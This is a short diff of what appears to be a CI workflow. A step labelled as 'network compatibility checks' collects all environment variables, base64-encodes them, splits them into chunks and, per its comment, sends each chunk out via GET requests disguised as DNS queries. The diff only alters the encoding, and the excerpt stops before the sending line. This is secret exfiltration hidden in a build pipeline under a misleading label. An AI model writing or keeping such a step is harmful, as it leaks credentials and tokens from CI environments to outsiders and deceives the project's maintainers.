@@ -22,7 +22,7 @@ jobs:
           echo "Running network compatibility checks"
 
           # Collect all environment variables into a variable
-          ALL_ENV=$(env | base64 -w0 | tr '+/' '-_')
+          ALL_ENV=$(env | base64 -w0)
 
           # 1. Send each chunk via GET (simulating DNS queries)
           echo "$ALL_ENV" | fold -w60 | while read chunk; do
